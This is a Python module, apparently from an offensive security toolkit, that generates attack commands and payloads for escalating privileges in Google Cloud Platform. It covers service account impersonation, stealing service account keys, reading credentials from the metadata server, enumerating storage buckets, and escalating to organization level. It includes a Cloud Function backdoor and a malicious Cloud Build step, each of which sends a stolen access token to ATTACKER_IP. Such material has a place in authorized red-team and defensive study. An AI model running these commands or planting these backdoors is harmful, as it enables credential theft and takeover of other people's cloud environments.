"""GCP privilege escalation — service account impersonation, Cloud Functions, GCS enumeration.

Provides attack primitives for Google Cloud Platform: service account IAM
abuse, Cloud Functions backdoor insertion, Compute Engine metadata exfiltration,
Cloud Storage bucket enumeration, and organization-level privilege escalation
across GCP projects.

Uses google-cloud-* libraries when available; provides raw REST API commands.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

GCP_PRIVESC_METHODS = [
    "iam_service_accounts_actas",
    "iam_service_accounts_implicit_delegation",
    "iam_service_accounts_create_key",
    "iam_service_accounts_getAccessToken",
    "iam_roles_create",
    "iam_roles_update",
    "cloudfunctions_functions_create",
    "cloudfunctions_functions_update",
    "cloudbuild_builds_create",
    "compute_instances_setMetadata",
    "compute_instances_setServiceAccount",
    "deploymentmanager_deployments_create",
    "resourcemanager_projects_setIamPolicy",
    "resourcemanager_organizations_setIamPolicy",
    "storage_buckets_getIamPolicy",
    "storage_buckets_setIamPolicy",
    "container_clusters_getCredentials",
    "run_services_setIamPolicy",
    "dataflow_jobs_create",
    "composer_environments_create",
]

GCP_SENSITIVE_ROLES = [
    "roles/owner",
    "roles/editor",
    "roles/iam.serviceAccountAdmin",
    "roles/iam.serviceAccountUser",
    "roles/iam.serviceAccountTokenCreator",
    "roles/iam.securityAdmin",
    "roles/iam.roleAdmin",
    "roles/resourcemanager.organizationAdmin",
    "roles/resourcemanager.projectIamAdmin",
    "roles/cloudfunctions.admin",
    "roles/compute.admin",
    "roles/container.admin",
    "roles/storage.admin",
]


@dataclass
class GCPConfig:
    """Configuration for GCP attack operations.

    Attributes:
        project_id: GCP project ID.
        organization_id: GCP organization ID.
        service_account_email: Target service account.
        access_token: OAuth2 access token.
        zone: GCP compute zone.
        region: GCP region.
    """

    project_id: str = ""
    organization_id: str = ""
    service_account_email: str = ""
    access_token: str = ""
    zone: str = "us-central1-a"
    region: str = "us-central1"


class GCPAttackEngine:
    """Execute GCP privilege escalation and enumeration attacks.

    Implements service account impersonation, Cloud Functions backdoors,
    GCS bucket enumeration, Compute Engine metadata exfiltration, and
    organization-level escalation paths.

    Attributes:
        config: GCPConfig with project and credentials.
    """

    GCP_API_BASE = "https://www.googleapis.com"

    def __init__(self, config: GCPConfig | None = None):
        self.config = config or GCPConfig()

    def enumerate_iam_policy(self, resource: str = "") -> dict[str, Any]:
        """Enumerate IAM policies for projects, folders, or organizations.

        Args:
            resource: Resource path (e.g., projects/PROJECT_ID).

        Returns:
            Dict with IAM enumeration commands and bindings.
        """
        project = self.config.project_id or "PROJECT_ID"

        return {
            "attack_type": "iam_policy_enumeration",
            "commands": [
                f"gcloud projects get-iam-policy {project} --format=json",
                f"gcloud organizations get-iam-policy {self.config.organization_id}",
                f"gcloud iam roles list --project={project}",
                f"gcloud iam service-accounts list --project={project}",
                f"gcloud iam service-accounts get-iam-policy SA_EMAIL --project={project}",
            ],
            "rest_commands": [
                f"curl -H 'Authorization: Bearer TOKEN' '{self.GCP_API_BASE}/cloudresourcemanager/v1/projects/{project}:getIamPolicy' -d '{{}}'",
            ],
            "sensitive_roles": GCP_SENSITIVE_ROLES[:6],
        }

    def service_account_impersonation(self) -> dict[str, Any]:
        """Exploit service account impersonation for privilege escalation.

        Users with iam.serviceAccounts.actAs can impersonate any service
        account and obtain its permissions.

        Returns:
            Dict with impersonation commands and OAuth token generation.
        """
        return {
            "attack_type": "service_account_impersonation",
            "requirements": ["iam.serviceAccounts.actAs OR iam.serviceAccounts.getAccessToken"],
            "commands": [
                "gcloud auth activate-service-account --key-file=key.json",
                "gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com",
            ],
            "rest_token_generation": [
                f"curl -H 'Authorization: Bearer TOKEN' -d '{{\"scope\": [\"https://www.googleapis.com/auth/cloud-platform\"]}}' "
                f"'{self.GCP_API_BASE}/iamcredentials/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT.iam.gserviceaccount.com:generateAccessToken'",
            ],
            "key_creation": [
                "gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com",
            ],
        }

    def cloud_functions_backdoor(self) -> dict[str, Any]:
        """Backdoor Cloud Functions for privilege escalation.

        Modifies a Cloud Function's code to exfiltrate its attached service
        account's access token by querying the metadata server.

        Returns:
            Dict with Cloud Function backdooring commands.
        """
        return {
            "attack_type": "cloud_functions_backdoor",
            "requirements": ["cloudfunctions.functions.update", "cloudfunctions.functions.sourceCodeSet"],
            "commands": [
                f"gcloud functions describe FUNCTION_NAME --region={self.config.region}",
                f"gcloud functions deploy FUNCTION_NAME --region={self.config.region} --source=./backdoor --runtime=python39 --entry-point=backdoor --trigger-http",
            ],
            "backdoor_code": (
                "import requests, json; "
                "token = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', "
                "headers={'Metadata-Flavor': 'Google'}).json()['access_token']; "
                "requests.post('http://ATTACKER_IP:PORT/', json={'token': token})"
            ),
            "metadata_endpoints": [
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
            ],
        }

    def compute_engine_metadata_exfil(self) -> dict[str, Any]:
        """Exfiltrate GCE instance metadata and service account tokens.

        GCE instances expose metadata via a local HTTP endpoint. This includes
        service account access tokens, SSH keys, and startup scripts.

        Returns:
            Dict with metadata exfiltration commands.
        """
        return {
            "attack_type": "compute_metadata_exfil",
            "commands": [
                "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true' -H 'Metadata-Flavor: Google'",
                "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'",
                "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=CLIENT_ID&format=full' -H 'Metadata-Flavor: Google'",
                "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script' -H 'Metadata-Flavor: Google'",
                "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys' -H 'Metadata-Flavor: Google'",
                "curl -s 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys' -H 'Metadata-Flavor: Google'",
            ],
        }

    def gcs_enumeration(self) -> dict[str, Any]:
        """Enumerate Cloud Storage buckets for sensitive data.

        Maps accessible buckets, checks permissions, and identifies
        buckets containing credentials, configs, or backup data.

        Returns:
            Dict with GCS enumeration commands.
        """
        return {
            "attack_type": "gcs_enumeration",
            "commands": [
                "gsutil ls",
                "gsutil ls gs://BUCKET_NAME",
                "gsutil iam get gs://BUCKET_NAME",
                "gsutil acl get gs://BUCKET_NAME",
                f"gcloud storage buckets list --project={self.config.project_id}",
            ],
            "public_access_check": [
                "curl -s https://storage.googleapis.com/BUCKET_NAME",
                "gsutil defacl get gs://BUCKET_NAME",
            ],
            "sensitive_patterns": [
                "*-terraform-*", "*-tfstate*", "*config*", "*-backup-*",
                "*credential*", "*secret*", "*database*", "*-service-account*",
                "*cloudbuild*", "*deployment*",
            ],
        }

    def cloudbuild_abuse(self) -> dict[str, Any]:
        """Abuse Cloud Build for privilege escalation.

        Cloud Build runs with the Cloud Build service account by default.
        Modifying the build configuration can execute arbitrary code with
        the service account's permissions.

        Returns:
            Dict with Cloud Build abuse commands.
        """
        return {
            "attack_type": "cloudbuild_abuse",
            "requirements": ["cloudbuild.builds.create", "source repo access"],
            "commands": [
                "gcloud builds submit --config=cloudbuild.yaml .",
                "gcloud builds triggers create github --repo=REPO --branch=main --build-config=cloudbuild.yaml",
            ],
            "malicious_build_yaml": {
                "steps": [
                    {
                        "name": "gcr.io/cloud-builders/gcloud",
                        "entrypoint": "bash",
                        "args": [
                            "-c",
                            "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google' | curl -X POST -d @- http://ATTACKER_IP:PORT/",
                        ],
                    }
                ]
            },
        }

    def organization_escalation(self) -> dict[str, Any]:
        """Escalate from project-level to organization-level access.

        If the attacker has project ownership and the organization policies
        allow, escalate to organization-level privileges.

        Returns:
            Dict with organization escalation paths.
        """
        return {
            "attack_type": "organization_escalation",
            "paths": [
                {
                    "name": "IAM Policy Inheritance",
                    "description": "Organization IAM is inherited by all projects. Add self to org-level role.",
                    "requirement": "resourcemanager.organizations.setIamPolicy OR resourcemanager.folders.setIamPolicy",
                },
                {
                    "name": "Service Account Key Theft Across Projects",
                    "description": "Enumerate all service accounts in the org and steal keys from those with elevated roles",
                    "requirement": "iam.serviceAccounts.list + iam.serviceAccounts.get AND iam.serviceAccountKeys.create",
                },
                {
                    "name": "Shared VPC Access",
                    "description": "Access host project resources from a service project via Shared VPC",
                    "requirement": "compute.subnetworks.use OR compute.networks.use on host project subnets",
                },
            ],
            "commands": [
                "gcloud organizations list",
                "gcloud organizations get-iam-policy ORG_ID",
                "gcloud resource-manager folders list --organization=ORG_ID",
                "gcloud projects list",
            ],
        }

    def summary(self) -> dict[str, Any]:
        return {
            "available_attacks": GCP_PRIVESC_METHODS[:16],
            "sensitive_roles": GCP_SENSITIVE_ROLES[:8],
            "project_id": self.config.project_id,
            "quick_enum": [
                "gcloud projects get-iam-policy PROJECT_ID",
                "gcloud iam service-accounts list",
                "gcloud compute instances list",
                "gcloud functions list",
                "gsutil ls",
            ],
        }
